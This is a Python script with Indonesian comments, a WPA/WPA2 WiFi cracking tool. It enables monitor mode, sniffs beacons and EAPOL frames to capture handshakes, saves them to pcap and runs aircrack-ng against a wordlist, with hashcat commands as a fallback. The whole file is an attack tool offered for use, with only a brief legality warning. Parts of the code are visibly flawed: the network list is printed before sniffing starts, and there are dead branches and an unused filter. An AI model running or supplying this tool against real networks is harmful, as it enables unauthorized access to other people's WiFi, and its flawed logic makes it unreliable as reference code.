#!/usr/bin/env python3
"""
WPA/WPA2 Handshake Capture & Crack Tool
[ROOT REQUIRED] Menangkap WPA handshake dan/atau melakukan cracking password WiFi.

Penggunaan:
    python wifi_cracker.py --mode capture --iface wlan0 --output capture.pcap
    python wifi_cracker.py --mode crack --pcap capture.pcap --wordlist rockyou.txt
    python wifi_cracker.py --mode full --iface wlan0 --essid "MyWiFi" --wordlist rockyou.txt --output capture.pcap

Peringatan: Hanya untuk pengujian keamanan yang sah. Penggunaan tanpa izin adalah ilegal.
"""

import argparse
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from threading import Event
from pathlib import Path

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp,
        Dot11Elt, Dot11Auth, Dot11AssoReq, Dot11AssoResp,
        EAPOL, sniff, wrpcap, rdpcap, conf
    )
except ImportError:
    sys.exit("[!] Scapy tidak terinstall. Install dengan: pip install scapy")

STOP_EVENT = Event()
HANDSHAKE_CAPTURED = Event()
captured_handshake = {
    "bssid": None, "essid": None, "channel": None,
    "encryption": None, "packets": []
}


def check_root():
    if os.name == "posix" and os.geteuid() != 0:
        sys.exit("[!] Tool ini memerlukan akses root. Jalankan dengan sudo.")


def signal_handler(sig, frame):
    print("\n[!] Menerima sinyal interrupt...")
    STOP_EVENT.set()


def enable_monitor_mode(iface: str) -> str:
    if os.name != "posix":
        return iface
    mon_iface = iface + "mon"
    try:
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, timeout=10)
    except Exception:
        pass
    try:
        subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], capture_output=True, check=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, check=True)
        print(f"[+] Interface {iface} diubah ke monitor mode.")
        return iface
    except subprocess.CalledProcessError:
        subprocess.run(["iw", "dev"], capture_output=True)
    return iface


def disable_monitor_mode(iface: str):
    if os.name != "posix":
        return
    try:
        subprocess.run(["iw", "dev", iface, "set", "type", "managed"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
        print(f"[+] Interface {iface} dikembalikan ke managed mode.")
    except Exception:
        pass


def extract_essid_from_elt(elts) -> str | None:
    elt = next((e for e in elts if hasattr(e, "ID") and e.ID == 0), None)
    if elt and hasattr(elt, "info"):
        try:
            return elt.info.decode("utf-8", errors="replace").strip("\x00")
        except Exception:
            return None
    return None


def get_encryption_info(pkt) -> str:
    cap = pkt.sprintf("%Dot11Beacon.cap%")
    enc = []
    if "privacy" in cap.lower():
        enc.append("WPA")
    elts = []
    while hasattr(pkt, "payload"):
        pkt = pkt.payload
        if hasattr(pkt, "ID") and hasattr(pkt, "info"):
            elts.append(pkt)
    rsn = any(e.ID == 48 for e in elts)  # RSN = WPA2
    if rsn:
        enc.append("WPA2")
    wpa_info = next((e for e in elts if e.ID == 221 and b"WPA" in bytes(e.info)), None)
    if wpa_info:
        enc.append("WPA")
    return "/".join(enc) if enc else "OPEN"


class HandshakeSniffer:
    def __init__(self, iface: str, essid_filter: str | None, output_file: str):
        self.iface = iface
        self.essid_filter = essid_filter
        self.output_file = output_file
        self.bssid = None
        self.essid = None
        self.channel = None
        self.encryption = None
        self.packets = []
        self.eapol_count = {}
        self.ap_list = {}

    def packet_handler(self, pkt):
        if STOP_EVENT.is_set() or HANDSHAKE_CAPTURED.is_set():
            return

        if not pkt.haslayer(Dot11):
            return

        if pkt.haslayer(Dot11Beacon):
            bssid = pkt.addr2
            essid = extract_essid_from_elt(pkt.getlayer(Dot11Elt) or [])
            if hasattr(pkt.payload, "payload") and hasattr(pkt.payload.payload, "ID"):
                pass
            current = None
            elt_layer = pkt.getlayer(Dot11Elt)
            if elt_layer or bssid:
                pass
            if essid:
                enc = get_encryption_info(pkt)
                ch = None
                try:
                    ds_params = next(
                        (e for e in pkt[Dot11Elt] if hasattr(e, "ID") and e.ID == 3), None
                    )
                    if ds_params and hasattr(ds_params, "info") and len(ds_params.info) > 0:
                        ch = ord(ds_params.info[0:1])
                except Exception:
                    pass
                self.ap_list[bssid] = {"essid": essid, "channel": ch, "encryption": enc}

        if self.essid_filter:
            if self.bssid is None:
                for bssid, info in self.ap_list.items():
                    if info["essid"] == self.essid_filter:
                        self.bssid = bssid
                        self.essid = info["essid"]
                        self.channel = info.get("channel")
                        self.encryption = info.get("encryption")
                        print(f"\n[+] Target AP ditemukan:")
                        print(f"    BSSID: {self.bssid}")
                        print(f"    ESSID: {self.essid}")
                        print(f"    Channel: {self.channel}")
                        print(f"    Enkripsi: {self.encryption}")
                        print(f"[*] Menunggu WPA handshake...")
                        break

        bssid = pkt.addr2 or pkt.addr1 or ""
        src = pkt.addr2 or ""
        dst = pkt.addr1 or ""

        if self.essid_filter and self.bssid and bssid != self.bssid:
            if src != self.bssid and dst != self.bssid:
                return

        if pkt.haslayer(EAPOL):
            client_mac = src if src != bssid else dst
            if client_mac not in self.eapol_count:
                self.eapol_count[client_mac] = 0
            self.eapol_count[client_mac] += 1
            self.packets.append(pkt)
            print(f"\n[+] Paket EAPOL #{self.eapol_count[client_mac]} dari {client_mac}")
            frames_needed = {1, 2, 3, 4}
            if frames_needed.issubset(set(range(1, self.eapol_count[client_mac] + 1))) or \
               self.eapol_count[client_mac] >= 4:
                HANDSHAKE_CAPTURED.set()
                if self.essid_filter and self.bssid:
                    captured_handshake["bssid"] = self.bssid
                    captured_handshake["essid"] = self.essid
                    captured_handshake["channel"] = self.channel
                    captured_handshake["encryption"] = self.encryption
                captured_handshake["packets"] = self.packets


def capture_mode(args):
    print("-" * 55)
    print("  MODE: CAPTURE")
    print("-" * 55)
    iface = args.iface
    try:
        mon_iface = enable_monitor_mode(iface)
    except Exception:
        mon_iface = iface

    sniffer = HandshakeSniffer(mon_iface, args.essid, args.output)
    filter_str = "type mgt subtype beacon or type mgt subtype probe-resp or type data"
    if args.essid:
        print(f"[*] Memfilter berdasarkan ESSID: {args.essid}")

    print(f"[*] Memindai jaringan pada {mon_iface}...")
    print(f"[*] Tampilkan daftar AP terdeteksi dalam 5 detik...")
    time.sleep(5)

    if sniffer.ap_list:
        print(f"\n[+] {len(sniffer.ap_list)} AP terdeteksi:")
        print(f"    {'BSSID':<19} {'Ch':>3} {'Enkripsi':<12} ESSID")
        print(f"    {'-'*19} {'-'*3} {'-'*12} {'-'*20}")
        for bssid, info in sorted(sniffer.ap_list.items()):
            ch = info.get("channel") or "?"
            enc = info.get("encryption") or "?"
            essid = info.get("essid") or "(hidden)"
            print(f"    {bssid:<19} {str(ch):>3} {enc:<12} {essid}")

    if not args.essid:
        print(f"\n[!] ESSID tidak ditentukan. Menangkap semua handshake yang terdeteksi.")
        print(f"[!] Gunakan --essid untuk memfilter target spesifik.")
    print(f"\n[*] Menunggu WPA handshake... (Ctrl+C untuk berhenti)")

    try:
        sniff(iface=mon_iface, prn=sniffer.packet_handler, store=False,
              timeout=args.timeout if args.timeout > 0 else None,
              stop_filter=lambda x: STOP_EVENT.is_set() or HANDSHAKE_CAPTURED.is_set())
    except Exception as e:
        print(f"[!] Error saat sniffing: {e}")

    disable_monitor_mode(mon_iface)

    if sniffer.packets:
        output = args.output or f"wpa_handshake_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        wrpcap(output, sniffer.packets)
        print(f"\n[+] Handshake disimpan ke: {output}")
        info = captured_handshake
        print(f"[+] Ringkasan:")
        print(f"    BSSID: {info.get('bssid') or 'N/A'}")
        print(f"    ESSID: {info.get('essid') or 'N/A'}")
        print(f"    Channel: {info.get('channel') or 'N/A'}")
        print(f"    Enkripsi: {info.get('encryption') or 'N/A'}")
        print(f"    Total paket EAPOL: {len(sniffer.packets)}")
        return output
    else:
        print("\n[!] Tidak ada handshake yang tertangkap.")
        return None


def crack_mode(args):
    print("-" * 55)
    print("  MODE: CRACK")
    print("-" * 55)
    pcap_file = args.pcap
    wordlist = args.wordlist

    if not os.path.exists(pcap_file):
        sys.exit(f"[!] File PCAP tidak ditemukan: {pcap_file}")
    if not os.path.exists(wordlist):
        sys.exit(f"[!] Wordlist tidak ditemukan: {wordlist}")

    print(f"[*] PCAP: {pcap_file}")
    print(f"[*] Wordlist: {wordlist}")

    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        sys.exit(f"[!] Gagal membaca PCAP: {e}")

    eapol_packets = [p for p in packets if p.haslayer(EAPOL)]
    if not eapol_packets:
        sys.exit("[!] Tidak ada paket EAPOL dalam file PCAP.")

    bssid = None
    essid = None
    for p in eapol_packets:
        if not bssid:
            bssid = p.addr2 or p.addr1
        if not essid and p.haslayer(Dot11Beacon):
            elt = p.getlayer(Dot11Elt)
            if elt:
                essid = extract_essid_from_elt([elt])
    print(f"[+] BSSID: {bssid or 'N/A'}")
    print(f"[+] ESSID: {essid or 'N/A'}")
    print(f"[+] Paket EAPOL: {len(eapol_packets)}")

    aircrack_cmd = ["aircrack-ng", "-w", wordlist, pcap_file]
    if essid:
        aircrack_cmd.extend(["-e", essid])
    print(f"[*] Menjalankan: {' '.join(aircrack_cmd)}")

    try:
        result = subprocess.run(aircrack_cmd, capture_output=False, text=True)
    except FileNotFoundError:
        print("[!] aircrack-ng tidak ditemukan. Install aircrack-ng terlebih dahulu.")
        print("    Linux: sudo apt install aircrack-ng")
        hashcat_hint(pcap_file, wordlist, essid, bssid)
        return

    print("[+] Cracking selesai.")


def hashcat_hint(pcap_file: str, wordlist: str, essid: str | None, bssid: str | None):
    print("\n[*] Alternatif: gunakan hashcat untuk cracking.")
    if bssid:
        print(f"    1. Konversi PCAP ke format hashcat:")
        if os.name == "posix":
            print(f"       hcxpcapngtool -o handshake.hc22000 {pcap_file}")
        print(f"    2. Crack dengan hashcat:")
        print(f"       hashcat -m 22000 handshake.hc22000 {wordlist}")


def run_full_mode(args):
    print("=" * 55)
    print("  MODE: FULL (Capture + Crack)")
    print("=" * 55)
    pcap = capture_mode(args)
    if pcap:
        print("\n")
        crack_args = argparse.Namespace(pcap=pcap, wordlist=args.wordlist)
        crack_mode(crack_args)
    else:
        print("[!] Tidak dapat melanjutkan ke cracking karena handshake tidak tertangkap.")


def main():
    parser = argparse.ArgumentParser(
        description="WPA/WPA2 Handshake Capture & Crack Tool [ROOT REQUIRED]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  python wifi_cracker.py --mode capture --iface wlan0 --essid "MyWiFi" --output capture.pcap
  python wifi_cracker.py --mode crack --pcap capture.pcap --wordlist rockyou.txt
  python wifi_cracker.py --mode full --iface wlan0 --essid "MyWiFi" --wordlist rockyou.txt
        """,
    )
    parser.add_argument("--mode", required=True, choices=["capture", "crack", "full"],
                        help="Mode operasi: capture, crack, atau full")
    parser.add_argument("--iface", help="Interface WiFi (contoh: wlan0)")
    parser.add_argument("--essid", help="Filter ESSID target")
    parser.add_argument("--output", help="File output PCAP untuk handshake")
    parser.add_argument("--pcap", help="File PCAP untuk cracking")
    parser.add_argument("--wordlist", help="File wordlist untuk cracking")
    parser.add_argument("--timeout", type=int, default=0,
                        help="Timeout capture dalam detik (0 = tanpa timeout)")
    args = parser.parse_args()

    if args.mode in ("capture", "full") and not args.iface:
        sys.exit("[!] --iface diperlukan untuk mode capture/full")
    if args.mode in ("crack", "full"):
        if not args.wordlist:
            sys.exit("[!] --wordlist diperlukan untuk mode crack/full")
        if args.mode == "crack" and not args.pcap:
            sys.exit("[!] --pcap diperlukan untuk mode crack")
        if args.pcap and not os.path.exists(args.pcap):
            sys.exit(f"[!] File PCAP tidak ditemukan: {args.pcap}")
        if args.wordlist and not os.path.exists(args.wordlist):
            sys.exit(f"[!] Wordlist tidak ditemukan: {args.wordlist}")

    print("=" * 55)
    print("  WPA/WPA2 Handshake Capture & Crack Tool")
    print("  [ROOT REQUIRED]")
    print("=" * 55)

    if args.mode != "crack":
        check_root()

    signal.signal(signal.SIGINT, signal_handler)

    print("[!] Peringatan: Hanya untuk pengujian keamanan yang sah dan terotorisasi!")
    time.sleep(0.5)

    if args.mode == "capture":
        capture_mode(args)
    elif args.mode == "crack":
        crack_mode(args)
    elif args.mode == "full":
        run_full_mode(args)


if __name__ == "__main__":
    main()
